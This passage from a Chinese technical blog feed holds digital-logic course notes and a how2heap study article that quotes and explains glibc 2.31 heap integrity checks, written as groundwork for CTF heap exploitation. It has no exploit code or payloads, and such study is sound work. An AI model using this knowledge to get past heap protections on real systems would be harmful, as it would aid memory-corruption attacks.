color=red>[注意：状态表中次态大列中每一小列的顺序应该按照格雷码的顺序来写，即如果输入2位，则从左到右应依次为：00，01，11，10]</font>）<br>第三条任意输入，输出相同→现态相邻（看Moore状态表中输出列是否有相等的、看Mealy状态表中次态&#x2F;输出的n小列中是否有输出完全相等的两行）</p></li><li><p>乘法的电路设计<br>一般设计某两个数乘法都需要用到4位加法器。在加法器数量有限的情况下，如何使用最少的加法器完成功能？对于二进制乘法，可以将其转换为加法计算。如4位二进制数的乘法，输出最多8位。通过列竖式可以求出每一位的值，同时可以发现4位二进制数的乘法实际上就是4个二进制数的加法。假设两个4位二进制数为$a_3a_2a_1a_0,b_3b_2b_1b_0$，则最低位$c_0&#x3D;a_0b_0$直接与即可输出无需占用加法器资源。在加的时候要注意进位的输出。</p></li><li><p>数电实验<br>在数电实验码表控制器模块，状态对应输出有5个，分别解释意义：<br>DP-SEL：码表显示选择器，其为1时显示当前计时，为0显示最好纪录<br>SD-EN：寄存器使能端，当需要更新最好纪录时置为高电平<br>SD-SEL：选择输入，第一次记录纪录时为1<br>TM-EN：计数器使能端，计时时为1，停止时为0<br>TM-Reset：码表清零端，清零时为1，将记录和时间均清除</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数字逻辑 Chapter 8——可编程逻辑器件</title>
      <link href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-8%E2%80%94%E2%80%94%E5%8F%AF%E7%BC%96%E7%A8%8B%E9%80%BB%E8%BE%91%E5%99%A8%E4%BB%B6/"/>
      <url>/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-8%E2%80%94%E2%80%94%E5%8F%AF%E7%BC%96%E7%A8%8B%E9%80%BB%E8%BE%91%E5%99%A8%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="8-1-PLD"><a href="#8-1-PLD" class="headerlink" title="8.1 PLD"></a>8.1 PLD</h1><h2 id="8-1-1-PLD基本结构"><a href="#8-1-1-PLD基本结构" class="headerlink" title="8.1.1 PLD基本结构"></a>8.1.1 PLD基本结构</h2><p>PLD阵列由一个与阵列和一个或阵列构成，与阵列输出为输入的与-或函数，每个与门的输出产生某些输入变量的与项作为或阵列的输入。每个或门的输出端产生输入变量的与或表达式<br>4种主要类型：</p><ul><li>可编程只读存储器PROM</li><li>可编程逻辑阵列PLA</li><li>可编程阵列逻辑PAL</li><li>通用阵列逻辑GAL</li></ul><h1 id="8-2-低密度可编程逻辑器件"><a href="#8-2-低密度可编程逻辑器件" class="headerlink" title="8.2 低密度可编程逻辑器件"></a>8.2 低密度可编程逻辑器件</h1><h1 id="8-2-1-可编程只读存储器PROM"><a href="#8-2-1-可编程只读存储器PROM" class="headerlink" title="8.2.1 可编程只读存储器PROM"></a>8.2.1 可编程只读存储器PROM</h1><p>半导体存储器按功能分类：随机存放存储器RAM，只读存储器ROM</p><p>PROM逻辑结构：主要由地址译码器和存储器两部分组成<br>由一个固定连接的与阵列和一个可编程连接的或阵列构成</p><p>分类：</p><ul><li>一次编程ROM（PROM）：所有存储元均被加工成同一状态，用户可以通过编程将某些存储元的状态改变为另一状态，这种编程只能执行一次，编程完毕之后不能再改变。</li><li>可抹可编程（EPROM）：可以通过用户专用的紫外线灯照射受光窗口使原存储内容抹去，只能整体擦除。</li><li>电可抹可编程（EEPROM）：擦除速度快，允许改写次数远高于EPROM</li><li>快闪存储器（Flash Mem）</li></ul><h2 id="8-2-2-可编程逻辑阵列PLA"><a href="#8-2-2-可编程逻辑阵列PLA" class="headerlink" title="8.2.2 可编程逻辑阵列PLA"></a>8.2.2 可编程逻辑阵列PLA</h2><p>与阵列和或阵列均可编程。</p><h2 id="8-2-3-可编程阵列逻辑PAL"><a href="#8-2-3-可编程阵列逻辑PAL" class="headerlink" title="8.2.3 可编程阵列逻辑PAL"></a>8.2.3 可编程阵列逻辑PAL</h2><p>与阵列可编程，或阵列固定。</p><h2 id="8-2-4-通用逻辑阵列GAL"><a href="#8-2-4-通用逻辑阵列GAL" class="headerlink" title="8.2.4 通用逻辑阵列GAL"></a>8.2.4 通用逻辑阵列GAL</h2><p>与PAL相同，与阵列可编程而或阵列固定，但在输出端集成有输出宏单元（OLMC），允许用户定义每个输出的结构和功能。</p><h1 id="8-3-高密度可编程逻辑器件"><a href="#8-3-高密度可编程逻辑器件" class="headerlink" title="8.3 高密度可编程逻辑器件"></a>8.3 高密度可编程逻辑器件</h1><h2 id="8-3-1-现场可编程门阵列"><a href="#8-3-1-现场可编程门阵列" class="headerlink" title="8.3.1 现场可编程门阵列"></a>8.3.1 现场可编程门阵列</h2><p>FPGA</p><h1 id="8-4-在系统编程技术简介"><a href="#8-4-在系统编程技术简介" class="headerlink" title="8.4 在系统编程技术简介"></a>8.4 在系统编程技术简介</h1><h2 id="8-4-1-ISP"><a href="#8-4-1-ISP" class="headerlink" title="8.4.1 ISP"></a>8.4.1 ISP</h2><h2 id="8-4-2-ISP逻辑器件"><a href="#8-4-2-ISP逻辑器件" class="headerlink" title="8.4.2 ISP逻辑器件"></a>8.4.2 ISP逻辑器件</h2><p>归纳：<br>可编程的部分有：</p><ul><li>PROM的或门阵列</li><li>PLA的与&#x2F;或门阵列</li><li>PAL的与门阵列</li><li>GAL的与门阵列</li></ul><p>不可编程的部分有：</p><ul><li>PROM的与门阵列</li><li>PAL的或门阵列</li><li>GAL的或门阵列</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>how2heap 深入学习(9)</title>
      <link href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-9/"/>
      <url>/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-9/</url>
      
        <content type="html"><![CDATA[<p>how2heap下载网址: <a href="https://github.com/shellphish/how2heap">传送门</a><br>Glibc源码查看网址：<a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3516">传送门</a><br>参考书籍：CTF竞赛权威指南-pwn篇</p><p>测试环境：Ubuntu 20.04<br>Glibc 版本：Ubuntu GLIBC 2.31-0ubuntu9.7</p><p>最近做题，由于对2.31中添加的检查项缺乏总结，导致浪费了很多时间，本文分析glibc 2.31中关键函数中的检查项。如果读者仔细看过我写的前8篇文章，对于各种bin的结构应该已经较为熟悉，本文的阅读难度就不大了，如有疑问请移步。目前分析的函数有：_int_malloc，unlink_chunk，_int_free函数，之后会更新其他函数的分析。<br>如果本文的分析有任何错漏之处，还请各位读者不吝赐教，不胜感激。</p><h1 id="一、-int-malloc"><a href="#一、-int-malloc" class="headerlink" title="一、_int_malloc"></a><font color=red><strong>一、_int_malloc</strong><font></h1><h2 id="1-fastbin部分"><a href="#1-fastbin部分" class="headerlink" title="1. fastbin部分"></a><strong>1. fastbin部分</strong></h2><h3 id="（1）检查victim是否应该存在于该fastbin"><a href="#（1）检查victim是否应该存在于该fastbin" class="headerlink" title="（1）检查victim是否应该存在于该fastbin"></a>（1）检查victim是否应该存在于该fastbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 3592</span></span><br><span class="line"><span class="type">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里的<code>fastbin_index</code>函数指的应该是根据victim的大小获取到其应该存放的fastbin索引。显然0x30大小的chunk在正常情况下不可能跑到专门存放0x20大小chunk的fastbin中，该检查就是针对这种异常情况，能够防止victim的size被修改。</p><h2 id="2-tcache部分"><a href="#2-tcache部分" class="headerlink" title="2. tcache部分"></a><strong>2. tcache部分</strong></h2><p>在2.31版本中，通过搜索关键函数tcache_put、malloc_printerr没有找到对tcache的检查。</p><h2 id="3-small-bins部分"><a href="#3-small-bins部分" class="headerlink" title="3. small bins部分"></a><strong>3. small bins部分</strong></h2><h3 id="（1）检查victim-gt-bck-gt-fwd是否为victim"><a href="#（1）检查victim-gt-bck-gt-fwd是否为victim" class="headerlink" title="（1）检查victim-&gt;bck-&gt;fwd是否为victim"></a>（1）检查<code>victim-&gt;bck-&gt;fwd</code>是否为victim</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 3643</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="4-unsorted-bin部分"><a href="#4-unsorted-bin部分" class="headerlink" title="4. unsorted bin部分"></a><strong>4. unsorted bin部分</strong></h2><p>关于这部分的检查是最多的，也是最难以绕过的。</p><h3 id="（1）检查victim的size是否合法"><a href="#（1）检查victim的size是否合法" class="headerlink" title="（1）检查victim的size是否合法"></a>（1）检查victim的size是否合法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 3734</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure><p>victim的大小不应小于0x20（64位），不应大于av-&gt;system_mem</p><h3 id="（2）检查物理地址居victim高位的chunk的size是否合法"><a href="#（2）检查物理地址居victim高位的chunk的size是否合法" class="headerlink" title="（2）检查物理地址居victim高位的chunk的size是否合法"></a>（2）检查物理地址居victim高位的chunk的size是否合法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"><span class="comment">// line 3737</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里的<code>chunk_at_offset</code>函数指的是将victim往后size处作为一个chunk返回，也就是这里检查物理相邻的chunk的size</p><h3 id="（3）检查物理地址居victim高位的prev-size是否等于victim的size"><a href="#（3）检查物理地址居victim高位的prev-size是否等于victim的size" class="headerlink" title="（3）检查物理地址居victim高位的prev_size是否等于victim的size"></a>（3）检查物理地址居victim高位的prev_size是否等于victim的size</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 3740</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure><p>由于victim是一个free chunk，因此物理地址居高位的chunk的开头理应存放victim的size，这里进行检查。</p><h3 id="（4）检查unsorted-bin链中victim-gt-bck-gt-fd是否是victim，victim-gt-fd是否为unsorted-bin头"><a href="#（4）检查unsorted-bin链中victim-gt-bck-gt-fd是否是victim，victim-gt-fd是否为unsorted-bin头" class="headerlink" title="（4）检查unsorted bin链中victim-&gt;bck-&gt;fd是否是victim，victim-&gt;fd是否为unsorted bin头"></a>（4）检查unsorted bin链中<code>victim-&gt;bck-&gt;fd</code>是否是victim，<code>victim-&gt;fd</code>是否为unsorted bin头</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 3742</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br></pre></td></tr></table></figure><p>大循环遍历期间，每一次拿出来的victim都在unsorted bin的尾部，其fd指针一定指向unsorted bin头，bk指向后一个chunk或unsorted bin头（当unsorted bin仅有这一个chunk时），因此正常情况下<code>victim-&gt;bck-&gt;fd==victim</code>与<code>victim-&gt;fd==unsorted_chunks(av)</code>一定成立。</p><h3 id="（5）检查物理地址居victim高位的chunk的prev-inuse位是否为0"><a href="#（5）检查物理地址居victim高位的chunk的prev-inuse位是否为0" class="headerlink" title="（5）检查物理地址居victim高位的chunk的prev_inuse位是否为0"></a>（5）检查物理地址居victim高位的chunk的prev_inuse位是否为0</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 3745</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="（6）第二次检查unsorted-bin链中victim-gt-bck-gt-fd是否是victim"><a href="#（6）第二次检查unsorted-bin链中victim-gt-bck-gt-fd是否是victim" class="headerlink" title="（6）第二次检查unsorted bin链中victim-&gt;bck-&gt;fd是否是victim"></a>（6）第二次检查unsorted bin链中<code>victim-&gt;bck-&gt;fd</code>是否是victim</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 3785</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br></pre></td></tr></table></figure><p>在可能进行的remainder拆分后，再一次进行检查。目前尚不清楚这里再次检查的意义何在，理解后更新。</p><h3 id="（7）第三次检查unsorted-bin链中bck-gt-fd是否是victim"><a href="#（7）第三次检查unsorted-bin链中bck-gt-fd是否是victim" class="headerlink" title="（7）第三次检查unsorted bin链中bck-&gt;fd是否是victim"></a>（7）第三次检查unsorted bin链中<code>bck-&gt;fd</code>是否是victim</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 3954</span></span><br><span class="line">bck = unsorted_chunks (av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);</span><br></pre></td></tr></table></figure><p>这个检查发生于非small bins大小申请的last_remainder拆分部分，又一次进行了unsorted bin的双向链表完整性检查。</p><h3 id="（8）第四次检查unsorted-bin链中bck-gt-fd是否是victim"><a href="#（8）第四次检查unsorted-bin链中bck-gt-fd是否是victim" class="headerlink" title="（8）第四次检查unsorted bin链中bck-&gt;fd是否是victim"></a>（8）第四次检查unsorted bin链中<code>bck-&gt;fd</code>是否是victim</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4058</span></span><br><span class="line">bck = unsorted_chunks (av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br></pre></td></tr></table></figure><p>这个检查发生在切割large bin部分，切割后剩余的部分作为last_remainder放入unsorted bin，因此检查。</p><h2 id="5-large-bins部分"><a href="#5-large-bins部分" class="headerlink" title="5. large bins部分"></a><strong>5. large bins部分</strong></h2><h3 id="（1）检查fwd-gt-bk-nextsize-gt-fd-nextsize是否等于fwd"><a href="#（1）检查fwd-gt-bk-nextsize-gt-fd-nextsize是否等于fwd" class="headerlink" title="（1）检查fwd-&gt;bk_nextsize-&gt;fd_nextsize是否等于fwd"></a>（1）检查<code>fwd-&gt;bk_nextsize-&gt;fd_nextsize</code>是否等于fwd</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 3867</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure><p>这个检查发生在victim被链入到large bins的过程中，fwd表示victim被链入后处于victim之前的chunk。这里的检查在正常情况下显然成立。</p><h3 id="（2）检查fwd-gt-bk-gt-fd是否等于fwd"><a href="#（2）检查fwd-gt-bk-gt-fd是否等于fwd" class="headerlink" title="（2）检查fwd-&gt;bk-&gt;fd是否等于fwd"></a>（2）检查<code>fwd-&gt;bk-&gt;fd</code>是否等于fwd</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 3872</span></span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>这个检查也发生在victim被链入到large bins的过程中，检查large bin中双向链表的完整性。</p><h2 id="6-top-chunk部分"><a href="#6-top-chunk部分" class="headerlink" title="6. top chunk部分"></a>6. top chunk部分</h2><h3 id="（1）检查top-chunk大小"><a href="#（1）检查top-chunk大小" class="headerlink" title="（1）检查top chunk大小"></a>（1）检查top chunk大小</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4106</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br></pre></td></tr></table></figure><p>检查top chunk是否大到离谱。</p><h1 id="二、unlink-chunk"><a href="#二、unlink-chunk" class="headerlink" title="二、unlink_chunk"></a><font color=red><strong>二、unlink_chunk</strong></font></h1><h3 id="（1）检查物理地址居victim高位的chunk的prev-size是否等于victim的size"><a href="#（1）检查物理地址居victim高位的chunk的prev-size是否等于victim的size" class="headerlink" title="（1）检查物理地址居victim高位的chunk的prev_size是否等于victim的size"></a>（1）检查物理地址居victim高位的chunk的prev_size是否等于victim的size</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 1453</span></span><br><span class="line"><span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="（2）检查前后双向链表完整性：fd-gt-bk-p-bk-gt-fd-p"><a href="#（2）检查前后双向链表完整性：fd-gt-bk-p-bk-gt-fd-p" class="headerlink" title="（2）检查前后双向链表完整性：fd-&gt;bk != p || bk-&gt;fd != p"></a>（2）检查前后双向链表完整性：<code>fd-&gt;bk != p || bk-&gt;fd != p</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 1459</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="（3）检查large-bins双向链表完整性：p-gt-fd-nextsize-gt-bk-nextsize-p-p-gt-bk-nextsize-gt-fd-nextsize-p"><a href="#（3）检查large-bins双向链表完整性：p-gt-fd-nextsize-gt-bk-nextsize-p-p-gt-bk-nextsize-gt-fd-nextsize-p" class="headerlink" title="（3）检查large bins双向链表完整性：p-&gt;fd_nextsize-&gt;bk_nextsize != p || p-&gt;bk_nextsize-&gt;fd_nextsize != p"></a>（3）检查large bins双向链表完整性：<code>p-&gt;fd_nextsize-&gt;bk_nextsize != p || p-&gt;bk_nextsize-&gt;fd_nextsize != p</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 1466</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">|| p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="三、-int-free"><a href="#三、-int-free" class="headerlink" title="三、_int_free"></a><font color=red>三、_int_free</font></h1><h3 id="（1）检查size是否合理，chunk是否正确对齐"><a href="#（1）检查size是否合理，chunk是否正确对齐" class="headerlink" title="（1）检查size是否合理，chunk是否正确对齐"></a>（1）检查size是否合理，chunk是否正确对齐</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4171</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): invalid pointer&quot;</span>);</span><br></pre></td></tr></table></figure><p>简单解释一下第一个判断的意思：<code>(uintptr_t) p &gt; (uintptr_t) -size</code>。它指的是chunk的地址加上chunk的size不能导致整形溢出。这很好理解，正常情况下这种情况不会发生。不过如果想理解这条语句，需要进行一些移项。</p><p>两边均为无符号整数，则-size&#x3D;&#x3D;2^64-size，等式可以变形为：<code>p+size&gt;2^64</code>。</p><h3 id="（2）检查size是否过小，检查size是否对齐"><a href="#（2）检查size是否过小，检查size是否对齐" class="headerlink" title="（2）检查size是否过小，检查size是否对齐"></a>（2）检查size是否过小，检查size是否对齐</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4176</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): invalid size&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里的MINSIZE&#x3D;0x10，最小的chunk不能小于这个大小。</p><h3 id="（3）检查tcache-double-free"><a href="#（3）检查tcache-double-free" class="headerlink" title="（3）检查tcache double free"></a>（3）检查tcache double free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4187</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在chunk被链入tcache时，会对chunk进行标记，也即将成员key标记为tcache的地址。</p><p>tcache chunk定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 2894</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>注意上面的tcache_entry结构体在chunk中的头部是可写段的头部而非chunk的头部，前面还有size和prev_size两个字段。</p><p>观察_int_free中的代码，我们可以发现，在这个过程中，如果glibc发现要free的chunk（以下称p）有标志，则说明很可能这是一次double free。为了确认无误，glibc会对相应的tcache中的所有chunk进行检查，如果确实发现该chunk已经存在于tcache中，再报错退出。这是为了防止异常的误报。如果本身这不是一个double free，而key正好填的也是tcache，glibc不能认定这是一次double free，因此它遍历tcache中的chunk进行确认。</p><h3 id="（4）检查fastbin-chunk-size"><a href="#（4）检查fastbin-chunk-size" class="headerlink" title="（4）检查fastbin chunk size"></a>（4）检查fastbin chunk size</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4236</span></span><br><span class="line"><span class="type">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">   getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (!have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">    __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fail)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>这里检查p的大小是否过小或过大，与_int_malloc中对应检查相同。在检查过程中对这个main_arena上锁以避免多线程的影响。</p><h3 id="（5）检查fastbin-double-free"><a href="#（5）检查fastbin-double-free" class="headerlink" title="（5）检查fastbin double free"></a>（5）检查fastbin double free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 